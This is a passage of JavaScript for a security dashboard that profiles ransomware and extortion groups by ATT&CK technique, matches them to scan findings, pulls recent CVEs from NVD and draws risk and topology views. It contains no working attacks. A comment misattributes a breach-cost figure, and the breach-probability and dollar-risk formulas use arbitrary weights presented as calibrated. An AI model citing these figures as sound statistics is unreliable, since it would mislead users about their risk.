    desc:'Data extortion group using insider recruitment, SIM swapping, and MFA fatigue to breach Microsoft, Okta, Samsung, and Nvidia.',
    chain:[{icon:'👥',title:'Insider Recruitment',desc:'Direct contact with employees via Telegram to purchase or coerce credentials.'},{icon:'📱',title:'MFA Fatigue (T1621)',desc:'Repeated push notifications until the exhausted target approves the login.'},{icon:'☁️',title:'Cloud Access (T1530)',desc:'Exploiting legitimate cloud access to exfiltrate source code repositories.'},{icon:'💬',title:'Extortion',desc:'Publishing stolen data or threatening to as leverage for payment demands.'}] },

  { id:'cl0p',      name:'Cl0p',           alias:'TA505 / FIN11',                 nation:'Eastern Europe', flag:'🌐', risk_level:4,
    targets:['Manufacturing','Financial','Healthcare','Education'],
    ttps:['T1190','T1059.001','T1486','T1041','T1078','T1003','T1021.001','T1053'],
    tools:['Cl0p Ransomware','Get2','TinyMet'],
    desc:'Prolific RaaS group specialising in zero-day exploitation of managed file transfer software (MOVEit, GoAnywhere, Accellion).',
    chain:[{icon:'💥',title:'MFT Zero-Day (T1190)',desc:'Exploitation of critical flaws in managed file transfer software with zero-days.'},{icon:'🌐',title:'Web Shell (T1505.003)',desc:'Persistent backdoor on the MFT server for continued data access.'},{icon:'📁',title:'Mass Exfiltration (T1041)',desc:'Bulk theft of all data managed through the file transfer platform.'},{icon:'🔒',title:'Extortion',desc:'Threats to publish exfiltrated data unless ransom paid — often no encryption.'}] },

  { id:'scattered', name:'Scattered Spider',alias:'UNC3944 / Octo Tempest',       nation:'USA/UK',        flag:'🌐', risk_level:5,
    targets:['Technology','Hospitality','Financial','Insurance'],
    ttps:['T1078','T1621','T1566.004','T1539','T1550.001','T1530','T1213','T1537'],
    tools:['Social Engineering','SIM Swapping','SpecterInsight'],
    desc:'Native English-speaking group using sophisticated vishing and SIM swapping to breach Caesars, MGM, and major tech firms in 2023.',
    chain:[{icon:'📞',title:'Vishing + SIM Swap',desc:'Voice phishing IT helpdesks combined with SIM hijacking to bypass MFA.'},{icon:'🆔',title:'Account Takeover (T1078)',desc:'Full account takeover using legitimate credentials and identity reset flows.'},{icon:'☁️',title:'Cloud Pivot (T1537)',desc:'Moving from compromised identity to cloud infrastructure and data stores.'},{icon:'💰',title:'ALPHV Partnership',desc:'Partnering with ransomware groups (BlackCat/ALPHV) to deploy encryption.'}] },
];

function loadThreatActors() {
  renderTAList(THREAT_ACTORS);
  document.getElementById('taSearch')?.addEventListener('input', (e) => {
    const q = e.target.value.toLowerCase();
    renderTAList(q ? THREAT_ACTORS.filter(a =>
      a.name.toLowerCase().includes(q) || a.alias.toLowerCase().includes(q) || a.nation.toLowerCase().includes(q)
    ) : THREAT_ACTORS);
  });
}

function renderTAList(actors) {
  const list = document.getElementById('taList');
  if (!list) return;
  list.innerHTML = actors.map(a => `
    <div class="ta-card" data-id="${a.id}" onclick="selectThreatActor('${a.id}')">
      <span class="ta-flag">${a.flag}</span>
      <div class="ta-info">
        <div class="ta-name">${esc(a.name)}</div>
        <div class="ta-alias">${esc(a.alias)}</div>
      </div>
      <div class="ta-rl">${Array.from({length:5},(_,i)=>`<div class="ta-rl-dot${i<a.risk_level?'':' dim'}"></div>`).join('')}</div>
    </div>`).join('');
}

function selectThreatActor(id) {
  const actor = THREAT_ACTORS.find(a => a.id === id);
  if (!actor) return;
  document.querySelectorAll('.ta-card').forEach(c => c.classList.toggle('active', c.dataset.id === id));

  const actorTTPs = new Set(actor.ttps);
  const matchedTTPs = new Set();
  const matchedFindings = [];

  STATE.findings.forEach(f => {
    const hits = (f.attack_techniques || []).filter(t => actorTTPs.has(t));
    if (hits.length) { hits.forEach(t => matchedTTPs.add(t)); matchedFindings.push({ f, techniques: hits }); }
  });

  const exposurePct = actor.ttps.length ? matchedTTPs.size / actor.ttps.length : 0;
  const exposureScore = (Math.min(10, exposurePct * 10)).toFixed(1);
  const expColor = exposurePct >= 0.5 ? 'var(--critical)' : exposurePct >= 0.25 ? '#f0853a' : 'var(--success)';
  const expLabel = exposurePct >= 0.5 ? 'High Exposure' : exposurePct >= 0.25 ? 'Medium Exposure' : 'Low Exposure';

  const detail = document.getElementById('taDetail');
  if (!detail) return;

  detail.innerHTML = `
    <div class="glass-card" style="margin-bottom:16px">
      <div class="ta-profile-header">
        <div class="ta-profile-flag">${actor.flag}</div>
        <div class="ta-profile-meta">
          <div class="ta-profile-name">${esc(actor.name)}</div>
          <div class="ta-profile-alias">${esc(actor.alias)} · ${esc(actor.nation)}</div>
          <p class="ta-profile-desc">${esc(actor.desc)}</p>
          <div class="ta-targets">${actor.targets.map(t=>`<span class="ta-target-tag">${esc(t)}</span>`).join('')}</div>
        </div>
        <div class="ta-exposure-block">
          <div class="exposure-score-big" style="color:${expColor}">${exposureScore}</div>
          <div style="font-size:10px;color:var(--text-3);text-transform:uppercase;letter-spacing:0.07em;margin-top:4px">/ 10</div>
          <div style="font-size:11px;color:${expColor};font-weight:700;margin-top:4px">${expLabel}</div>
        </div>
      </div>
      <div class="exposure-meter-wrap">
        <div class="exposure-meter-row">
          <span>TTP Coverage in Your Environment</span>
          <span>${matchedTTPs.size} / ${actor.ttps.length} techniques matched</span>
        </div>
        <div class="exposure-bar-track">
          <div class="exposure-bar-fill" style="width:${(exposurePct*100).toFixed(0)}%"></div>
        </div>
      </div>
      <div style="margin-top:14px">
        <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-3);margin-bottom:8px">MITRE ATT&amp;CK Coverage</div>
        <div class="ttp-grid">
          ${actor.ttps.map(t=>`<span class="ttp-badge${matchedTTPs.has(t)?' matched':''}">${esc(t)}</span>`).join('')}
        </div>
        <div style="font-size:11px;color:var(--text-3);margin-top:10px">
          <span style="color:var(--critical)">■</span> Matched in your findings &nbsp;
          <span style="color:rgba(255,255,255,0.15)">■</span> Not detected
        </div>
      </div>
    </div>

    ${matchedFindings.length ? `
    <div class="glass-card" style="margin-bottom:16px">
      <div class="card-header"><span>Your Vulnerable Findings (${matchedFindings.length})</span><span style="font-size:11px;color:var(--critical);font-weight:700">EXPOSED</span></div>
      ${matchedFindings.slice(0,10).map(({f,techniques})=>`
        <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;border-radius:8px;background:rgba(240,79,89,0.05);border:1px solid rgba(240,79,89,0.15);margin-bottom:6px">
          <span class="sev sev-${f.severity}">${sevLabel(f.severity)}</span>
          <code style="font-size:11px;color:var(--text-3);flex-shrink:0">${esc(f.host)}</code>
          <span style="flex:1;font-size:13px;color:var(--text-1)">${esc(f.title)}</span>
          <span style="font-size:10px;color:var(--critical);font-family:'JetBrains Mono',monospace;flex-shrink:0">${techniques.join(', ')}</span>
        </div>`).join('')}
      ${matchedFindings.length > 10 ? `<div style="font-size:12px;color:var(--text-3);text-align:center;padding:8px">+${matchedFindings.length-10} more matching findings</div>` : ''}
    </div>` : `
    <div class="glass-card" style="margin-bottom:16px">
      <div style="padding:32px;text-align:center;color:var(--success);font-weight:700">
        ✓ No findings directly map to this actor's known TTPs
      </div>
    </div>`}

    <div class="glass-card">
      <div class="card-header"><span>Simulated Kill Chain</span><span style="font-size:11px;color:var(--text-3)">How ${esc(actor.name)} would attack you</span></div>
      <div class="attack-chain">
        ${actor.chain.map((s,i)=>`
          <div class="chain-step">
            <div class="chain-icon">${s.icon}</div>
            <div class="chain-body">
              <div class="chain-title">${i+1}. ${esc(s.title)}</div>
              <div class="chain-desc">${esc(s.desc)}</div>
            </div>
          </div>`).join('')}
      </div>
      <div style="margin-top:18px;padding:14px;border-radius:10px;background:rgba(124,106,247,0.06);border:1px solid rgba(124,106,247,0.2);font-size:13px;color:var(--text-2);line-height:1.6">
        💡 <strong style="color:var(--accent)">Recommended action:</strong>
        ${exposurePct > 0.3
          ? `Your environment has significant TTP overlap with ${actor.name}. Prioritise the ${matchedFindings.length} matched findings above — resolving these will directly reduce your exposure to this threat actor.`
          : `Your environment has limited overlap with ${actor.name}'s known TTPs. Maintain regular patching and monitor for the initial access indicators listed in this actor's profile.`}
      </div>
    </div>`;
}

// ══════════════════════════════════════════════════════════════
//  CROWN JEWEL BLAST RADIUS
// ══════════════════════════════════════════════════════════════

const JEWEL_ICONS  = { dc:'🏰', db:'🗄️', payment:'💳', pii:'👤', backup:'💾', custom:'⭐' };
const JEWEL_COLORS = { dc:'#f04f59', db:'#f0853a', payment:'#febc2e', pii:'#7c6af7', backup:'#4fc9f0', custom:'#4cf098' };

function getCrownJewels() {
  try { return JSON.parse(localStorage.getItem('xarex_crown_jewels') || '[]'); } catch { return []; }
}

function _saveJewels(jewels) {
  localStorage.setItem('xarex_crown_jewels', JSON.stringify(jewels));
}

function openAddJewelForm() {
  const f = document.getElementById('addJewelForm');
  if (f) f.style.display = f.style.display === 'none' ? '' : 'none';
}

function saveJewel() {
  const name = document.getElementById('jewelName')?.value.trim();
  const ip   = document.getElementById('jewelIP')?.value.trim();
  const type = document.getElementById('jewelType')?.value || 'custom';
  if (!name || !ip) return showError('Name and IP are required.');
  const jewels = getCrownJewels();
  jewels.push({ id: Date.now().toString(), name, ip, type, created: new Date().toISOString() });
  _saveJewels(jewels);
  document.getElementById('addJewelForm').style.display = 'none';
  if (document.getElementById('jewelName')) document.getElementById('jewelName').value = '';
  if (document.getElementById('jewelIP'))   document.getElementById('jewelIP').value   = '';
  renderJewelGrid();
}

function deleteJewel(id) {
  _saveJewels(getCrownJewels().filter(j => j.id !== id));
  renderJewelGrid();
}

async function renderJewelGrid() {
  const jewels = getCrownJewels();
  const grid = document.getElementById('jewelGrid');
  if (!grid) return;

  if (!jewels.length) {
    grid.innerHTML = '<div class="empty" style="padding:64px;text-align:center;grid-column:1/-1">No crown jewels defined yet.<br>Add your critical assets above to see blast radius analysis.</div>';
    const nb = document.getElementById('navJewelCount');
    if (nb) nb.style.display = 'none';
    return;
  }

  let allPaths = [];
  try { allPaths = await api('/api/v1/attack-paths?limit=2000').catch(() => []); } catch {}

  grid.innerHTML = jewels.map(j => {
    const directPaths   = allPaths.filter(p => p.target === j.ip || p.entry_point === j.ip);
    const indirectPaths = allPaths.filter(p => (p.nodes||[]).some(n => (n.host||n) === j.ip) && !directPaths.some(d => d.id === p.id));
    const total = directPaths.length + indirectPaths.length;
    const color = JEWEL_COLORS[j.type] || JEWEL_COLORS.custom;
    const icon  = JEWEL_ICONS[j.type]  || '⭐';
    const blastClass = total >= 5 ? '' : total >= 2 ? 'medium' : 'low';

    // ROI calculation — avg breach cost $4.88M (IBM DBIR 2024)
    const breachRisk = Math.min(100, total * 8 + (directPaths.length * 15));
    const dollarRisk = Math.round((breachRisk / 100) * 4880000 / 1000);

    return `<div class="jewel-card" style="--jewel-color:${color}">
      <button class="jewel-delete" onclick="event.stopPropagation();deleteJewel('${j.id}')" title="Remove">✕</button>
      <div class="jewel-header">
        <div class="jewel-icon-wrap">${icon}</div>
        <div class="jewel-meta">
          <div class="jewel-name">${esc(j.name)}</div>
          <div class="jewel-ip">${esc(j.ip)}</div>
        </div>
      </div>
      <div class="jewel-blast">
        <div class="blast-metric">
          <div class="blast-val ${blastClass}">${directPaths.length}</div>
          <div class="blast-lbl">Direct Paths</div>
        </div>
        <div class="blast-metric">
          <div class="blast-val ${indirectPaths.length === 0 ? 'low' : indirectPaths.length < 3 ? 'medium' : ''}">${indirectPaths.length}</div>
          <div class="blast-lbl">Indirect Paths</div>
        </div>
      </div>
      ${total > 0
        ? `<div class="blast-warn">⚠ ${total} attack path${total!==1?'s':''} lead to this asset · Est. $${dollarRisk}K breach risk</div>`
        : `<div class="blast-ok">✓ No known attack paths reach this asset</div>`}
      <button class="btn btn-ghost btn-sm" style="width:100%;margin-top:12px" onclick="navigateTo('attack-paths')">View Attack Paths →</button>
    </div>`;
  }).join('');

  const exposed = jewels.filter(j => {
    const p = allPaths.filter(p => p.target === j.ip || (p.nodes||[]).some(n => (n.host||n) === j.ip));
    return p.length > 0;
  }).length;
  const nb = document.getElementById('navJewelCount');
  if (nb) { nb.textContent = exposed; nb.style.display = exposed > 0 ? '' : 'none'; }
}

// ══════════════════════════════════════════════════════════════
//  CVE WATCH — Real-Time CVE Intelligence
// ══════════════════════════════════════════════════════════════

async function loadCVEWatch() {
  const feed = document.getElementById('cveFeed');
  if (feed) feed.innerHTML = '<div class="empty" style="padding:48px;text-align:center">Fetching from NIST NVD…<br><small style="color:var(--text-3)">This may take a few seconds</small></div>';

  const days = parseInt(document.getElementById('cveWindowFilter')?.value || '7');
  const end   = new Date();
  const start = new Date(end - days * 86400000);
  const fmt   = d => d.toISOString().replace('.000','');

  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=${fmt(start)}&pubEndDate=${fmt(end)}&resultsPerPage=100&noRejected`;
    const resp = await fetch(url);
    if (!resp.ok) throw new Error(`NVD returned ${resp.status}`);
    const data = await resp.json();

    const cves = (data.vulnerabilities || []).map(v => {
      const c = v.cve;
      const m31 = c.metrics?.cvssMetricV31?.[0];
      const m30 = c.metrics?.cvssMetricV30?.[0];
      const m2  = c.metrics?.cvssMetricV2?.[0];
      const score  = m31?.cvssData?.baseScore || m30?.cvssData?.baseScore || m2?.cvssData?.baseScore || 0;
      const vector = m31?.cvssData?.vectorString || '';
      const desc   = c.descriptions?.find(d => d.lang === 'en')?.value || '';
      const refs   = (c.references || []).map(r => r.url);
      const hasExploit = refs.some(r => /exploit|poc|github|metasploit|nuclei/i.test(r));
      return { id: c.id, score, desc, published: c.published?.slice(0,10), vector, hasExploit };
    }).sort((a,b) => b.score - a.score);

    // Build discovered service/product set from findings
    const discoveredKeywords = new Set();
    STATE.findings.forEach(f => {
      if (f.service) f.service.toLowerCase().split(/[\s\/\-]+/).forEach(w => { if (w.length > 3) discoveredKeywords.add(w); });
      if (f.title)   f.title.toLowerCase().split(/[\s\/\-]+/).forEach(w => { if (w.length > 4) discoveredKeywords.add(w); });
    });

    const matched = cves.filter(c => {
      const dl = c.desc.toLowerCase();
      return [...discoveredKeywords].some(kw => dl.includes(kw));
    });

    setText('cveTotalNew',   cves.length);
    setText('cveMatchedYou', matched.length);
    setText('cveCriticalNew', cves.filter(c => c.score >= 9).length);
    setText('cveWithExploit', cves.filter(c => c.hasExploit).length);

    const nb = document.getElementById('navCVECount');
    if (nb) { nb.textContent = matched.length; nb.style.display = matched.length > 0 ? '' : 'none'; }
    const mc = document.getElementById('cveMatchCount');
    if (mc) mc.textContent = matched.length ? `${matched.length} matched` : '';

    const lf = document.getElementById('cveLastFetched');
    if (lf) lf.textContent = `Fetched ${new Date().toLocaleTimeString()} · ${cves.length} CVEs`;

    if (!cves.length) {
      if (feed) feed.innerHTML = '<div class="empty" style="padding:48px;text-align:center">No CVEs in this window. Try a wider date range.</div>';
      return;
    }

    const sortedDisplay = [
      ...matched.map(c => ({...c, isMatch: true})),
      ...cves.filter(c => !matched.some(m => m.id === c.id)).map(c => ({...c, isMatch: false})),
    ];

    if (feed) feed.innerHTML = sortedDisplay.map(c => {
      const sc = c.score >= 9 ? 'critical' : c.score >= 7 ? 'high' : c.score >= 4 ? 'medium' : 'low';
      return `<div class="cve-row ${c.isMatch ? 'matched' : ''}" onclick="window.open('https://nvd.nist.gov/vuln/detail/${esc(c.id)}','_blank')">
        <span class="cve-id">${esc(c.id)}</span>
        <span class="cve-score-pill cve-score-${sc}">${c.score.toFixed(1)}</span>
        <span class="cve-title">${esc(c.desc.length > 200 ? c.desc.slice(0,200)+'…' : c.desc)}</span>
        <div class="cve-meta">
          ${c.isMatch ? '<span class="cve-match-badge">YOUR ENV</span>' : ''}
          ${c.hasExploit ? '<span class="cve-match-badge" style="background:rgba(240,133,58,0.15);color:#f0853a;border-color:rgba(240,133,58,0.4)">PoC</span>' : ''}
          <span class="cve-date">${c.published}</span>
        </div>
      </div>`;
    }).join('');

  } catch(e) {
    if (feed) feed.innerHTML = `<div class="empty" style="padding:48px;text-align:center">
      <strong style="color:var(--warning)">Failed to fetch CVEs</strong><br>
      <span style="font-size:12px;color:var(--text-3)">${esc(e.message)}<br>NVD API may be rate-limited (5 req/30s). Try again shortly.</span>
    </div>`;
  }
}

// ══════════════════════════════════════════════════════════════
//  RISK TREND CHART
// ══════════════════════════════════════════════════════════════

function drawRiskTrend() {
  const canvas = document.getElementById('riskTrendChart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const completed = STATE.scans.filter(s => s.status === 'completed').slice(-10);

  if (completed.length < 2) {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = 'rgba(255,255,255,0.18)';
    ctx.font = '12px Inter, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('Need 2+ completed scans', canvas.width/2, canvas.height/2);
    return;
  }

  const dataPoints = completed.map(s => ({
    name: s.name,
    score: Math.min(10, ((s.finding_count || 0) * 0.35)),
    date: (s.completed_at || s.started_at || '').slice(0,10),
  }));

  const W = canvas.width, H = canvas.height;
  const pad = { t:16, r:12, b:28, l:28 };
  const cw = W - pad.l - pad.r, ch = H - pad.t - pad.b;

  ctx.clearRect(0, 0, W, H);

  // Grid
  ctx.strokeStyle = 'rgba(255,255,255,0.05)';
  ctx.lineWidth   = 1;
  ctx.fillStyle   = 'rgba(255,255,255,0.22)';
  ctx.font        = '9px Inter, sans-serif';
  ctx.textAlign   = 'right';
  for (let i = 0; i <= 10; i += 2) {
    const y = pad.t + ch - (i/10)*ch;
    ctx.beginPath(); ctx.moveTo(pad.l, y); ctx.lineTo(pad.l+cw, y); ctx.stroke();
    ctx.fillText(i, pad.l-4, y+3);
  }

  const scores = dataPoints.map(d => d.score);
  const xStep  = cw / Math.max(dataPoints.length-1, 1);

  // Area gradient
  const grad = ctx.createLinearGradient(0, pad.t, 0, pad.t+ch);
  grad.addColorStop(0, 'rgba(240,79,89,0.22)');
  grad.addColorStop(1, 'rgba(240,79,89,0.01)');
  ctx.fillStyle = grad;
  ctx.beginPath();
  ctx.moveTo(pad.l, pad.t+ch);
  dataPoints.forEach((d,i) => ctx.lineTo(pad.l+i*xStep, pad.t+ch-(d.score/10)*ch));
  ctx.lineTo(pad.l+(dataPoints.length-1)*xStep, pad.t+ch);
  ctx.closePath(); ctx.fill();

  // Line
  ctx.strokeStyle = '#f04f59'; ctx.lineWidth = 2; ctx.lineJoin = 'round';
  ctx.beginPath();
  dataPoints.forEach((d,i) => { const x=pad.l+i*xStep, y=pad.t+ch-(d.score/10)*ch; i===0?ctx.moveTo(x,y):ctx.lineTo(x,y); });
  ctx.stroke();

  // Dots + labels
  ctx.textAlign = 'center';
  ctx.font = '9px Inter, sans-serif';
  dataPoints.forEach((d,i) => {
    const x = pad.l+i*xStep, y = pad.t+ch-(d.score/10)*ch;
    ctx.beginPath(); ctx.arc(x,y,4,0,Math.PI*2);
    ctx.fillStyle = '#f04f59'; ctx.fill();
    ctx.strokeStyle = '#120c24'; ctx.lineWidth = 2; ctx.stroke();
    if (i === 0 || i === dataPoints.length-1) {
      ctx.fillStyle = 'rgba(255,255,255,0.3)';
      ctx.fillText(d.date, x, pad.t+ch+14);
    }
  });

  // Trend badge
  const delta = scores[scores.length-1] - scores[0];
  const badge = document.getElementById('trendBadge');
  if (badge) {
    badge.className = `trend-badge ${Math.abs(delta)<0.3?'trend-flat':delta>0?'trend-up':'trend-down'}`;
    badge.textContent = Math.abs(delta)<0.3 ? '→ Stable' : delta>0 ? `↑ Worsening` : `↓ Improving`;
  }
  const footer = document.getElementById('riskTrendFooter');
  if (footer) footer.innerHTML = `<span>${dataPoints[0]?.date}</span><span>${dataPoints.length} scans</span><span>${dataPoints[dataPoints.length-1]?.date}</span>`;
}

// ══════════════════════════════════════════════════════════════
//  BREACH PROBABILITY GAUGE
// ══════════════════════════════════════════════════════════════

function updateBreachProbability() {
  // Verizon DBIR 2024: ~5% annual breach probability baseline per SME
  // Adjustments by severity count (industry-calibrated)
  const crit = parseInt(document.getElementById('statCritical')?.textContent) || 0;
  const high = parseInt(document.getElementById('statHigh')?.textContent) || 0;

  const basePct  = 5;
  const adjusted = Math.min(97, basePct + crit*4.5 + high*1.5);
  const pct      = Math.round(adjusted);

  const fill = document.getElementById('breachGaugeFill');
  const pctEl = document.getElementById('breachPct');
  const ctx   = document.getElementById('breachContext');

  if (pctEl) pctEl.textContent = `${pct}%`;

  // Arc: full arc = 157px (semi-circle)
  if (fill) fill.setAttribute('stroke-dasharray', `${(pct/100)*157} 157`);
  if (fill) fill.setAttribute('stroke', pct >= 60 ? '#f04f59' : pct >= 35 ? '#f0853a' : '#4cf098');

  if (ctx) {
    ctx.textContent = pct >= 60
      ? `High breach likelihood — immediate action required on ${crit} critical finding${crit!==1?'s':''}.`
      : pct >= 30
      ? `Elevated risk. Resolving ${crit + high} critical/high findings reduces this by ~${Math.round((crit*4.5+high*1.5)/adjusted*pct)}%.`
      : 'Risk profile is relatively low. Continue regular scanning and patching.';
  }
}

// ══════════════════════════════════════════════════════════════
//  NETWORK TOPOLOGY MAP
// ══════════════════════════════════════════════════════════════

const TOPO = {
  nodes: [], edges: [], dragging: null, offsetX: 0, offsetY: 0,
  scale: 1, panX: 0, panY: 0, isPanning: false, lastX: 0, lastY: 0,
  hoveredNode: null, selectedNode: null,
};

async function loadTopologyMap(scanId) {
  const canvas = document.getElementById('topoCanvas');
  if (!canvas) return;
  canvas.width  = canvas.offsetWidth  || 900;
  canvas.height = canvas.offsetHeight || 600;

  try {
    const params = new URLSearchParams();
    if (scanId) params.set('scan_id', scanId);
    const [hostRisk, paths] = await Promise.all([
      api(`/api/v1/findings/host-risk?${params}`).catch(() => []),
      api(`/api/v1/attack-paths?${params}&limit=500`).catch(() => []),
    ]);

    if (!hostRisk.length) {
      const ctx = canvas.getContext('2d');
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = 'rgba(255,255,255,0.2)';
      ctx.font = '14px Inter, sans-serif';
      ctx.textAlign = 'center';
      ctx.fillText('No hosts discovered yet. Run a scan first.', canvas.width/2, canvas.height/2);
      return;
    }

    // Layout: force-directed approximation (simple circular + repulsion)
    const cx = canvas.width/2, cy = canvas.height/2;
    const count = hostRisk.length;
    const radius = Math.min(cx, cy) * 0.65;

    TOPO.nodes = hostRisk.map((h, i) => {
      const angle = (i / count) * Math.PI * 2 - Math.PI/2;
      return {
        id: h.host, label: h.host, x: cx + Math.cos(angle)*radius, y: cy + Math.sin(angle)*radius,
        risk: h.risk_score, severity: h.max_severity, finding_count: h.finding_count,
        ports: h.open_ports || [], cves: h.cves || [],
        vx: 0, vy: 0,
      };
    });

    TOPO.edges = paths.slice(0,100).map(p => ({
      from: p.entry_point, to: p.target, risk: p.risk_score,
    })).filter(e => TOPO.nodes.some(n => n.id===e.from) && TOPO.nodes.some(n => n.id===e.to));

    setupTopoCanvas(canvas);
    runTopoSimulation(canvas);
  } catch(e) { console.warn('Topology error:', e); }
}

function runTopoSimulation(canvas) {
  let frame = 0;
  const run = () => {
    if (frame++ < 120) {
      // Simple repulsion + spring simulation
      const nodes = TOPO.nodes;
      nodes.forEach((a,i) => {
        nodes.forEach((b,j) => {
          if (i === j) return;
          const dx = a.x - b.x, dy = a.y - b.y;
          const dist = Math.sqrt(dx*dx + dy*dy) || 1;
          const force = Math.min(500/dist, 15);
          a.vx += (dx/dist)*force*0.3;
          a.vy += (dy/dist)*force*0.3;
        });
        // Center gravity
        a.vx += (canvas.width/2 - a.x) * 0.002;
        a.vy += (canvas.height/2 - a.y) * 0.002;
      });
      TOPO.edges.forEach(e => {
        const a = TOPO.nodes.find(n => n.id===e.from);
        const b = TOPO.nodes.find(n => n.id===e.to);
        if (!a || !b) return;
        const dx = b.x-a.x, dy = b.y-a.y, dist = Math.sqrt(dx*dx+dy*dy)||1;
        const spring = (dist-120)*0.02;
        a.vx += dx/dist*spring; a.vy += dy/dist*spring;
        b.vx -= dx/dist*spring; b.vy -= dy/dist*spring;
      });
      nodes.forEach(n => { n.x += n.vx; n.y += n.vy; n.vx *= 0.85; n.vy *= 0.85; });
      requestAnimationFrame(run);
    }
    drawTopo(canvas);
  };
  requestAnimationFrame(run);
}

function drawTopo(canvas) {
  const ctx = canvas.getContext('2d');
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.save();
  ctx.translate(TOPO.panX, TOPO.panY);
  ctx.scale(TOPO.scale, TOPO.scale);

  // Edges
  TOPO.edges.forEach(e => {
    const a = TOPO.nodes.find(n=>n.id===e.from), b = TOPO.nodes.find(n=>n.id===e.to);
    if (!a||!b) return;
    const danger = Math.min(1, e.risk/10);
    ctx.strokeStyle = `rgba(240,79,89,${0.15+danger*0.5})`;
    ctx.lineWidth   = 1+danger*2;
    ctx.setLineDash([5,5]);
    ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.stroke();
    ctx.setLineDash([]);
    // Arrow
    const ang = Math.atan2(b.y-a.y, b.x-a.x);
    const nr  = 14;
    ctx.fillStyle = `rgba(240,79,89,${0.4+danger*0.4})`;
    ctx.beginPath();
    ctx.moveTo(b.x-Math.cos(ang)*nr, b.y-Math.sin(ang)*nr);
    ctx.lineTo(b.x-Math.cos(ang)*nr-Math.cos(ang-0.4)*8, b.y-Math.sin(ang)*nr-Math.sin(ang-0.4)*8);
    ctx.lineTo(b.x-Math.cos(ang)*nr-Math.cos(ang+0.4)*8, b.y-Math.sin(ang)*nr-Math.sin(ang+0.4)*8);
    ctx.fill();
  });

  // Nodes
  TOPO.nodes.forEach(n => {
    const r = 12 + Math.min(n.finding_count||0, 10);
    const isHov = TOPO.hoveredNode === n.id;
    const isSel = TOPO.selectedNode === n.id;
    const color = n.risk >= 8 ? '#f04f59' : n.risk >= 6 ? '#f0853a' : n.risk >= 3 ? '#febc2e' : '#4cf098';

    if (isSel || isHov) {
      ctx.beginPath(); ctx.arc(n.x, n.y, r+6, 0, Math.PI*2);
      ctx.fillStyle = `${color}22`; ctx.fill();
    }

    // Glow
    const grd = ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,r);
    grd.addColorStop(0, `${color}99`); grd.addColorStop(1, `${color}33`);
    ctx.beginPath(); ctx.arc(n.x, n.y, r, 0, Math.PI*2);
    ctx.fillStyle = grd; ctx.fill();
    ctx.strokeStyle = color; ctx.lineWidth = isSel?2.5:1.5;
    ctx.stroke();

    // Label
    ctx.fillStyle = 'rgba(255,255,255,0.85)';
    ctx.font = `${isHov?'bold ':''} 10px 'JetBrains Mono', monospace`;
    ctx.textAlign = 'center';
    ctx.fillText(n.label, n.x, n.y+r+13);

    // Score
    ctx.fillStyle = color;
    ctx.font = 'bold 10px Inter, sans-serif';
    ctx.fillText(n.risk.toFixed(1), n.x, n.y+3);
  });

  ctx.restore();
}

function setupTopoCanvas(canvas) {
  const tooltip = document.getElementById('topoTooltip');
  const detail  = document.getElementById('topoNodeDetail');

  canvas.onmousemove = (e) => {
    const rect = canvas.getBoundingClientRect();
    const mx = (e.clientX - rect.left - TOPO.panX) / TOPO.scale;
    const my = (e.clientY - rect.top  - TOPO.panY) / TOPO.scale;

    if (TOPO.isPanning) {
      TOPO.panX += e.clientX - TOPO.lastX;
      TOPO.panY += e.clientY - TOPO.lastY;
      TOPO.lastX = e.clientX; TOPO.lastY = e.clientY;
      drawTopo(canvas); return;
    }

    const hit = TOPO.nodes.find(n => {
      const dx=n.x-mx, dy=n.y-my, r=12+Math.min(n.finding_count||0,10);
      return dx*dx+dy*dy <= r*r;
    });

    TOPO.hoveredNode = hit ? hit.id : null;
    canvas.style.cursor = hit ? 'pointer' : 'grab';

    if (hit && tooltip) {
      tooltip.style.display  = '';
      tooltip.style.left     = `${e.clientX - rect.left + 12}px`;
      tooltip.style.top      = `${e.clientY - rect.top  - 10}px`;
      tooltip.innerHTML = `<strong>${esc(hit.label)}</strong><br>Risk: ${hit.risk.toFixed(1)}/10<br>Findings: ${hit.finding_count}<br>Ports: ${hit.ports.slice(0,5).join(', ')||'—'}`;
    } else if (tooltip) { tooltip.style.display = 'none'; }
    drawTopo(canvas);
  };

  canvas.onmousedown = (e) => { TOPO.isPanning = true; TOPO.lastX = e.clientX; TOPO.lastY = e.clientY; };
  canvas.onmouseup   = () => { TOPO.isPanning = false; };
  canvas.onmouseleave= () => { TOPO.isPanning = false; if (tooltip) tooltip.style.display='none'; };

  canvas.onclick = (e) => {
    const rect = canvas.getBoundingClientRect();
    const mx = (e.clientX - rect.left - TOPO.panX) / TOPO.scale;
    const my = (e.clientY - rect.top  - TOPO.panY) / TOPO.scale;
    const hit = TOPO.nodes.find(n => { const dx=n.x-mx, dy=n.y-my, r=14+Math.min(n.finding_count||0,10); return dx*dx+dy*dy<=r*r; });
    if (hit) {
      TOPO.selectedNode = hit.id;
      if (detail) {
        detail.style.display = '';
        detail.innerHTML = `
          <button class="topo-detail-close" onclick="document.getElementById('topoNodeDetail').style.display='none'">✕</button>
          <div style="font-size:16px;font-weight:700;color:var(--text-1);margin-bottom:8px;font-family:'JetBrains Mono',monospace">${esc(hit.label)}</div>
          <div style="margin-bottom:12px">
            <span class="sev sev-${hit.severity}" style="font-size:11px">${hit.severity >= 4?'Critical':hit.severity>=3?'High':hit.severity>=2?'Medium':hit.severity>=1?'Low':'Info'}</span>
            <span style="font-size:12px;color:var(--text-3);margin-left:8px">Risk: ${hit.risk.toFixed(1)}/10</span>
          </div>
          <div style="font-size:12px;color:var(--text-2)">Findings: <strong style="color:var(--text-1)">${hit.finding_count}</strong></div>
          <div style="font-size:12px;color:var(--text-2);margin-top:6px">Open Ports:<br><code style="font-size:11px;color:#4fc9f0">${hit.ports.slice(0,10).join(', ')||'None detected'}</code></div>
